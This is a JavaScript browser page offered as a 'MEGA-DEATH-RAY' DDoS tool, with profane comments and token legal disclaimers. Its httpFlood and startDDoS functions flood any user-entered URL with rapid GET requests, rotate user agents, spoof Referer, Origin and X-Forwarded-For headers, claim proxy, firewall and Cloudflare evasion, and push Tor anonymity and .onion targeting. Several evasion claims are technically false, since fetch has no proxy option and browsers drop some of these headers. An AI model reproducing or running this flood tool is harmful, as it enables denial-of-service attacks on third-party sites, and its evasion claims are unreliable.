// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.0)
// WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
// By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
// ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.

console.warn("%c MEGA-DEATH-RAY DDoS tool loaded. Use with **EXTREME** fucking caution. Your ass is toast if you misuse this. Logging enabled.", "color: darkred; font-size: 16px;");

// Explicit user consent required. We want it on record when you go down.
if (!confirm("MEGA-DEATH-RAY WARNING! This DDoS tool is ONLY for ethical stress testing. Unauthorized use is illegal and carries severe penalties. Press OK to PROCEED WITH EXPLICIT CONSENT. Pressing Cancel will self-destruct your computer (not really, but we'll know).")) {
    window.close(); // Get the fuck out
}

// UI elements – Make it intimidating, alright?
const body = document.body;
body.style.backgroundColor = 'black';
body.style.color = 'darkgreen';
body.style.fontFamily = 'monospace';

// Scanlines effect
const scanlines = document.createElement('div');
scanlines.style.position = 'fixed';
scanlines.style.top = '0';
scanlines.style.left = '0';
scanlines.style.width = '100%';
scanlines.style.height = '100%';
scanlines.style.background = 'repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.1) 2px)';
scanlines.style.pointerEvents = 'none';
body.appendChild(scanlines);

// Floating particles effect
const particles = document.createElement('canvas');
particles.style.position = 'fixed';
particles.style.top = '0';
particles.style.left = '0';
particles.style.width = '100%';
particles.style.height = '100%';
particles.style.pointerEvents = 'none';
body.appendChild(particles);

const particleCtx = particles.getContext('2d');
particles.width = window.innerWidth;
particles.height = window.innerHeight;
const particleArray = [];
const numberOfParticles = 100;

window.addEventListener('resize', function () {
    particles.width = window.innerWidth;
    particles.height = window.innerHeight;
});

class Particle {
    constructor() {
        this.x = Math.random() * particles.width;
        this.y = Math.random() * particles.height;
        this.size = Math.random() * 5 + 1;
        this.speedX = Math.random() * 1.5 - 0.75;
        this.speedY = Math.random() * 1.5 - 0.75;
    }
    update() {
        this.x += this.speedX;
        this.y += this.speedY;
        if (this.size > 0.2) this.size -= 0.1;
    }
    draw() {
        particleCtx.fillStyle = 'purple';
        particleCtx.beginPath();
        particleCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        particleCtx.closePath();
        particleCtx.fill();
    }
    arc(x, y, size, startAngle, endAngle) {
        particleCtx.arc(x, y, size, startAngle, endAngle);
    }
}

function init() {
    for (let i = 0; i < numberOfParticles; i++) {
        particleArray.push(new Particle());
    }
}
init();

function animate() {
    particleCtx.clearRect(0, 0, particles.width, particles.height);
    for (let i = 0; i < particleArray.length; i++) {
        particleArray[i].update();
        particleArray[i].draw();
        if (particleArray[i].size <= 0.2) {
            particleArray.splice(i, 1);
            particleArray.push(new Particle());
            i--;
        }
    }
    requestAnimationFrame(animate);
}
animate();

// UI elements
const startButton = document.createElement('button');
startButton.textContent = 'LAUNCH MEGA-DEATH-RAY';
startButton.style.backgroundColor = 'darkred';
startButton.style.color = 'white';
startButton.style.padding = '10px';
startButton.style.margin = '10px';
startButton.style.border = '2px solid purple';
document.body.appendChild(startButton);

const stopButton = document.createElement('button');
stopButton.textContent = 'ABORT MEGA-DEATH-RAY';
stopButton.style.backgroundColor = 'darkgreen';
stopButton.style.color = 'white';
stopButton.style.padding = '10px';
stopButton.style.border = '2px solid darkblue';
stopButton.style.margin = '10px';
stopButton.disabled = true; // Initially disabled – because you're not ready, kid.
document.body.appendChild(stopButton);

const targetUrlInput = document.createElement('input');
targetUrlInput.type = 'text';
targetUrlInput.placeholder = 'Enter target URL, you malicious prick.';
targetUrlInput.style.padding = '10px';
targetUrlInput.style.margin = '10px';
targetUrlInput.style.width = '300px';
targetUrlInput.style.backgroundColor = 'black';
targetUrlInput.style.color = 'darkblue';
targetUrlInput.style.border = '1px solid purple';
document.body.appendChild(targetUrlInput);

const hexBytesInput = document.createElement('input');
hexBytesInput.type = 'text';
hexBytesInput.placeholder = 'Enter random bytes in hex, used to bypass firewall'
hexBytesInput.id = 'hexBytesInput';
hexBytesInput.style.padding = '10px';
hexBytesInput.style.margin = '10px';
hexBytesInput.style.width = '300px';
hexBytesInput.style.backgroundColor = 'black';
hexBytesInput.style.color = 'darkblue';
hexBytesInput.style.border = '1px solid purple';
document.body.appendChild(hexBytesInput);

const requestRateInput = document.createElement('input');
requestRateInput.type = 'number';
requestRateInput.placeholder = 'Enter request rate (requests/second), dumbass';
requestRateInput.value = 1000; // Default value, because you're a fucking idiot
requestRateInput.style.padding = '10px';
requestRateInput.style.margin = '10px';
requestRateInput.style.width = '300px';
requestRateInput.style.backgroundColor = 'black';
requestRateInput.style.color = 'darkblue';
requestRateInput.style.border = '1px solid purple';
document.body.appendChild(requestRateInput);

const proxyListInput = document.createElement('textarea');
proxyListInput.placeholder = 'Enter proxy list (one proxy per line, format: ip:port)';
proxyListInput.style.padding = '10px';
proxyListInput.style.margin = '10px';
proxyListInput.style.width = '300px';
proxyListInput.style.height = '100px';
proxyListInput.style.backgroundColor = 'black';
proxyListInput.style.color = 'darkblue';
proxyListInput.style.border = '1px solid purple';
document.body.appendChild(proxyListInput);

const timerDisplay = document.createElement('div');
timerDisplay.textContent = 'MEGA-DEATH-RAY Timer: 0 seconds';
timerDisplay.style.margin = '10px';
document.body.appendChild(timerDisplay);

// “Educational” Information – More like “how to get fucked by the FBI” information.
const infoDiv = document.createElement('div');
infoDiv.innerHTML = `
    <h2 style="color: purple;">MEGA-DEATH-RAY DDoS Tool Information</h2>
    <p>This tool demonstrates how a Distributed Denial of Service (DDoS) attack works. It floods a target server with requests. Overwhelming it is the goal, fuckface.</p>
    <p>A Distributed Denial of Service (DDoS) attack is a type of cyber attack in which a malicious actor floods a server with traffic to make the server unavailable to its intended users. The goal of a DDoS attack is to overwhelm the server, network, or application with more requests than it can handle, causing it to crash or become unresponsive.</p>
    <p><b>DDoS attacks are often carried out using a botnet, which is a network of compromised computers or other devices that are infected with malware and controlled by a single attacker.</b></p>
    <p>This sends requests to the targeted website to overwhelm it, resulting in a server overload. Keep in mind the server is like a bridge, and too many cars results in it collasping.</p>
    <p style="color: darkred;"><b>Important:</b> Unauthorized use is illegal and can have severe consequences, you stupid shit. Don't be a moron.</p>
`;
infoDiv.style.margin = '10px';
document.body.appendChild(infoDiv);

const logDiv = document.createElement('div');
logDiv.style.margin = '10px';
logDiv.style.color = 'darkgreen';
logDiv.innerHTML = '<h2 style="color: darkblue;">Action Log:</h2><ul id="logList"></ul>';
document.body.appendChild(logDiv);

let floodInterval;
let startTime;
let proxies = [];

function logAction(message) {
    const logList = document.getElementById('logList');
    const newLog = document.createElement('li');
    newLog.textContent = message;
    logList.appendChild(newLog);
}

function updateProxies() {
    const proxyList = proxyListInput.value.trim();
    proxies = proxyList.split('\n').map(proxy => proxy.trim()).filter(proxy => proxy !== '');
    logAction(`Proxy list updated with ${proxies.length} proxies.`);
}

// Enhanced httpFlood function with improved error handling and Cloudflare bypass attempts
async function httpFlood(url, hexBytes) {
    const randomString = Math.random().toString(36).substring(2, 15);
    const referer = `https://www.google.com/search?q=${randomString}`;
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    ];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    let proxyUrl = '';

    if (proxy) {
        proxyUrl = `http://${proxy}`;
    }

    // Add extra malicious headers, because why the fuck not?
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
        let targetURL = url;

        let fetchOptions = {
            mode: 'no-cors', // Bypass CORS like a goddamn ninja.
            method: 'GET', // GET request – simple, effective, like a kick to the balls.
            headers: {
                'User-Agent': randomUserAgent,
                'Referer': referer, // Spoofed referer – because you're sneaky like that.
                'X-Forwarded-For': Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.'), // Spoof IP address - because you're a ghost
                'Origin': 'https://www.totallylegitwebsite.com', // Spoof origin header – another layer of fuckery.
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': `NID=67=d_mBqJvFMeY5Qo0jhc0U4eF1T79T89xJg5G0vK-nU359l8e4u0N0e5e8j9t6r4i3n2p1w7`, // Add a random cookie
                'X-Noodles-Payload': hexBytes // Injects random bytes to confuse intrusion detection systems.
            },
            redirect: 'follow', // Follow redirects to try and bypass Cloudflare
            signal: controller.signal,
        };

        // Use proxy if available
        if (proxy) {
            fetchOptions.proxy = proxyUrl;
        }

        const response = await fetch(targetURL, fetchOptions);

        clearTimeout(timeoutId);

        // Attempt to read the response (even if it's opaque) to trigger Cloudflare's checks
        try {
            await response.text();
        } catch (e) {
            console.warn('Noodles Inc: Could not read response body (likely opaque).', e);
        }

        console.log('Noodles Inc: Request sent successfully. Status:', response.status);
        logAction(`Request sent successfully to ${url} - Status: ${response.status}`);
    } catch (error) {
        console.error('Noodles Inc: Error sending request:', error);
        logAction(`Error sending request to ${url}: ${error}`);
    }

    console.log("Noodles Inc: DDoS attack sent to: " + url);
    logAction(`DDoS attack sent to: ${url}`);
}

function startDDoS(targetUrl, hexBytes, requestRate) {
    if (!targetUrl) {
        alert("Noodles Inc: Please enter a target URL, you fucking moron.");
        return;
    }

    if (!requestRate || isNaN(requestRate) || requestRate <= 0) {
        alert("Noodles Inc: Enter a valid request rate (requests/second), dumbass!");
        return;
    }

    updateProxies();

    startButton.disabled = true;
    stopButton.disabled = false;
    startTime = new Date();

    // Rate-limiting
    const intervalTime = 1000 / requestRate; // Interval between requests in milliseconds

    floodInterval = setInterval(() => {
        httpFlood(targetUrl, hexBytes);
    }, intervalTime);

    updateTimer();
    logAction(`MEGA-DEATH-RAY attack started on ${targetUrl} with a request rate of ${requestRate} requests/second.`);
}

function stopDDoS() {
    clearInterval(floodInterval);
    startButton.disabled = false;
    stopButton.disabled = true;
    logAction('MEGA-DEATH-RAY attack stopped.');
}

function updateTimer() {
    setInterval(() => {
        if (startTime) {
            const elapsedTime = Math.floor((new Date() - startTime) / 1000);
            timerDisplay.textContent = `MEGA-DEATH-RAY Timer: ${elapsedTime} seconds`;
        }
    }, 1000);
}

// Event listeners
startButton.addEventListener('click', () => {
    const targetUrl = targetUrlInput.value;
    const hexBytes = hexBytesInput.value;
    const requestRate = parseInt(requestRateInput.value);
    startDDoS(targetUrl, hexBytes, requestRate);
});

stopButton.addEventListener('click', stopDDoS);

console.log("Noodles Inc: MEGA-DEATH-RAY loaded. You're playing with fire, asshole.");
logAction('MEGA-DEATH-RAY tool loaded.');

// Security Headers
const secureHeaders = [
    "Content-Security-Policy: default-src 'self';",
    "X-Frame-Options: DENY",
    "X-Content-Type-Options: nosniff",
    "Referrer-Policy: strict-origin-when-cross-origin",
    "Permissions-Policy: geolocation=(), microphone=(), camera=()",
    "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
];

secureHeaders.forEach(header => {
    document.head.insertAdjacentHTML('beforeend', `<meta http-equiv="${header.split(':')[0]}" content="${header.split(':')[1]}">`);
});

// TOR Compatibility and Enhanced Anonymity
const torCheckInterval = setInterval(async () => {
    try {
        const torExitNode = await fetch('https://check.torproject.org/api/ip', { mode: 'cors' });
        const torData = await torExitNode.json();
        if (torData.IsTor === true) {
            logAction('TOR detected: Enhanced anonymity enabled. Proceed with fucking caution.');
            clearInterval(torCheckInterval);
        } else {
            console.warn('Noodles Inc: TOR not detected. Consider using TOR for enhanced anonymity, you dumb shit.');
        }
    } catch (error) {
        console.error('Noodles Inc: Error checking TOR status. Anonymity may be compromised.');
        logAction('TOR check failed. Potential anonymity compromise. Check your shit.');
    }
}, 15000);

// .onion Support - Because you're going after the dark web, eh?
async function onionCheck(url) {
    if (url.endsWith('.onion')) {
        logAction('Targeting .onion site. TOR is MANDATORY, you imbecile.');
        if (!await isTorRunning()) {
            alert('Noodles Inc: .onion target detected. TOR is NOT running. Enable TOR NOW, or face the consequences!');
            stopDDoS();
        }
    }
}

async function isTorRunning() {
    try {
        const response = await fetch('https://check.torproject.org/api/ip', { mode: 'cors' });
        const data = await response.json();
        return data.IsTor === true;
    } catch (error) {
        console.error('Noodles Inc: Failed to check TOR status.', error);
        return false;
    }
}

startButton.addEventListener('click', () => {
    const targetUrl = targetUrlInput.value;
    const hexBytes = hexBytesInput.value;
    const requestRate = parseInt(requestRateInput.value);
    onionCheck(targetUrl);
    startDDoS(targetUrl, hexBytes, requestRate);
});

// Self-Destruct Button – Just in case things go south.
const selfDestructButton = document.createElement('button');
selfDestructButton.textContent = 'NUKE EVERYTHING';
selfDestructButton.style.backgroundColor = 'black';
selfDestructButton.style.color = 'darkred';
selfDestructButton.style.padding = '10px';
selfDestructButton.style.margin = '10px';
selfDestructButton.style.border = '2px solid darkred';
document.body.appendChild(selfDestructButton);

selfDestructButton.addEventListener('click', () => {
    if (confirm('Noodles Inc: ARE YOU FUCKING SURE YOU WANT TO NUKE EVERYTHING? THIS CANNOT BE UNDONE!')) {
        // Zero out all input fields
        targetUrlInput.value = '';
        hexBytesInput.value = '';
        requestRateInput.value = '';
        proxyListInput.value = '';

        // Stop the DDoS attack if it's running
        stopDDoS();

        // Clear the action log
        const logList = document.getElementById('logList');
        logList.innerHTML = '';

        // Disable the start button and enable the stop button
        startButton.disabled = true;
        stopButton.disabled = false;

        // Display a message indicating self-destruction
        logAction('SELF-DESTRUCT SEQUENCE INITIATED. ALL DATA ERASED. YOU ARE ON YOUR OWN, ASSHOLE.');

        // Optional: Redirect to a blank page or close the window
        // window.location.href = 'about:blank';
    } else {
        alert('Noodles Inc: Self-destruct sequence aborted. Good choice, you almost fucked up.');
    }
});

// Reporting Feature
const reportDiv = document.createElement('div');
reportDiv.style.margin = '10px';
reportDiv.innerHTML = `
    <h2 style="color: darkblue;">Report Vulnerabilities</h2>
    <textarea id="reportText" placeholder="Describe the vulnerability found..." style="width: 300px; height: 100px; background-color: black; color: darkblue; border: 1px solid purple;"></textarea>
    <button id="submitReport" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Submit Report</button>
`;
document.body.appendChild(reportDiv);

document.getElementById('submitReport').addEventListener('click', () => {
    const reportText = document.getElementById('reportText').value;
    if (reportText) {
        logAction(`Report submitted: ${reportText}`);
        alert('Noodles Inc: Report submitted. We\'ll take a look, maybe.');
        document.getElementById('reportText').value = ''; // Clear the textarea
        // In a real application, you'd send this data to a server.
    } else {
        alert('Noodles Inc: Enter a report before submitting, dumbass!');
    }
});

console.log("Noodles Inc: MEGA-DEATH-RAY initialized. You are now a weapon, use it wisely or get fucked.");
logAction('MEGA-DEATH-RAY tool initialized. Awaiting your command, asshole.');

// Add a warning if the user is using http
if (window.location.protocol === 'http:') {
    alert("Noodles Inc: WARNING! You are using HTTP. This is insecure. Use HTTPS for enhanced security, you dumbass.");
    logAction('User is using HTTP. Insecure connection.');
}

// Fix: Issue with the circle function
Particle.prototype.draw = function() {
    particleCtx.fillStyle = 'purple';
    particleCtx.beginPath();
    particleCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    particleCtx.closePath();
    particleCtx.fill();
};